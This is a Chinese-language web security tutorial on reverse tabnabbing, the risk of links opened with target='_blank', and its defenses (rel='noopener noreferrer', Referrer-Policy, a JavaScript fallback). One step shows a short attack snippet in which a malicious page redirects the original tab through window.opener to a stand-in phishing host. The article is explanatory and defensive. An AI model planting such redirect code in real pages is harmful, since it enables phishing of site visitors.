> 在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 `a` 标签上添加 `target="_blank"` 属性。
>
> 然而，就是这个属性，为钓鱼攻击者带来了可乘之机。

# 起源

## `parent` 与 `opener`

在说 `opener` 之前，可以先聊聊 `<iframe>` 中的 `parent`。

我们知道，在 `<iframe>` 中提供了一个用于父子页面交互的对象，叫做 `window.parent`，我们可以通过 `window.parent` 对象来从框架中的页面访问父级页面的 `window`。

`opener` 与 `parent` 一样，只不过是用于 `<atarget="_blank">` 在新标签页打开的页面的。通过 `<atarget="_blank">` 打开的页面，可以直接使用 `window.opener` 来访问来源页面的 `window` 对象。

## 同域与跨域

浏览器提供了完整的跨域保护，在域名相同时， `parent` 对象和 `opener` 对象实际上就直接是上一级的 `window` 对象；而当域名不同时， `parent` 和 `opener` 则是经过包装的一个 `global` 对象。这个 `global` 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 `DOMException`）。

![图片](https://mmbiz.qpic.cn/mmbiz_png/uTjO0lw2ibEzEyL0AicRPN97ERDwwZ6r4SLO5lf6l909AJJPcAia6BkS2kuZk2qenL4qbgKhdepGPZN1piblWcciciaQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/uTjO0lw2ibEzEyL0AicRPN97ERDwwZ6r4Se6tLemG6gC481e1xLv4ypnZ2oicGApAlj53C1nuRxWvibcJAvJ35pLiaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

在 `<iframe>` 中，提供了一个 `sandbox` 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 `<iframe>`的安全性。

# 利用

如果，你的网站上有一个链接，使用了 `target="_blank"`，那么一旦用户点击这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。

## 详细步骤

1. 

   在你的网站 `https://example.com` 上存在一个链接： `html<a href="https://an.evil.site"target="_blank">进入一个“邪恶”的网站</a>`

   

2. 

   用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 HTTP Header 中的 `Referer` 属性来判断用户的来源。

   并且，这个网站上包含着类似于这样的 JavaScript 代码：

   ```
   
   ```

   

3. 1. `consturl=encodeURIComponent('{{header.referer}}');`
   2. `window.opener.location.replace('https://a.fake.site/?'+url);`

4. 

   此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 `https://a.fake.site/?https%3A%2F%2Fexample.com%2F`。

   

5. 

   恶意网站 `https://a.fake.site` 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。

   

6. 

   用户关闭 `https://an.evil.site` 的标签页，回到原来的网站………………已经回不去了。

   

> 上面的攻击步骤是在跨域的情况下的，在跨域情况下， `opener` 对象和 `parent` 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 `DOMException`）。
>
> 但是与 `parent` 不同的是，**在跨域的情况下， `opener` 仍然可以调用 `location.replace` 方法**而 `parent` 则不可以。
>
> 如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。

# 防御

<iframe> 中有 sandbox 属性，而链接，则可以使用下面的办法：

## 1. Referrer Policy 和 noreferrer

上面的攻击步骤中，用到了 HTTP Header 中的 `Referer` 属性，实际上可以在 HTTP 的响应头中增加 `ReferrerPolicy` 头来保证来源隐私安全。

`ReferrerPolicy` 需要修改后端代码来实现，而在前端，也可以使用 `<a>` 标签的 `rel` 属性来指定 `rel="noreferrer"` 来保证来源隐私安全。

```
<a href="https://an.evil.site" target="_blank" rel="noreferrer">进入一个“邪恶”的网站</a>
```

> 但是要注意的是：即使限制了 `referer` 的传递，仍然不能阻止原标签被恶意跳转。

## 2. noopener

为了安全，现代浏览器都支持在 `<a>` 标签的 `rel` 属性中指定 `rel="noopener"`，这样，在打开的新标签页中，将无法再使用 `opener` 对象了，它为设置为了 `null`。

```
<a href="https://an.evil.site" target="_blank" rel="noopener">进入一个“邪恶”的网站</a>
```

## 3. JavaScript

`noopener` 属性看似是解决了所有问题，但是...浏览器的兼容性问题...

![图片](https://mmbiz.qpic.cn/mmbiz_png/uTjO0lw2ibEzEyL0AicRPN97ERDwwZ6r4SPvnh2oKXX25qAo5icwhdU4iczbMRCBOPSBStYQTIia0NIaCso7Pj5mfJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

可以看到，现在绝大多数浏览器都已经兼容了 `rel="noopener"` 属性了。但是，为了保护稍旧的“近代”浏览器或是很旧的“古代”浏览器甚至是“远古”浏览器，只有 `noopener` 属性还是远远不够的。

这时，就只能请出下面这段原生 JavaScript 来帮忙了。

```
"use strict";function openUrl(url) {  var newTab = window.open();  newTab.opener = null;  newTab.location = url;}
```

# 推荐

首先，在网站中的链接上，如果使用了 `target="_blank"`，就要带上 `rel="noopener"`，并且建议带上 `rel="noreferrer"`。类似于这样：

```
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer">进入一个“邪恶”的网站</a>
```

当然，在跳转到第三方网站的时候，为了 SEO 权重，还建议带上 `rel="nofollow"`，所以最终类似于这样：

```
<a href="https://an.evil.site" target="_blank" rel="noopener noreferrer nofollow">进入一个“邪恶”的网站</a>
```

# 性能

最后，再来说说性能问题。

如果网站使用了 `<atarget="_blank">`，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 JavaScript 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）。

而如果在链接中加入了 `noopener`，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响。

原文链接：https://mp.weixin.qq.com/s/T4jQUdS-rar7hr2EWilJrw

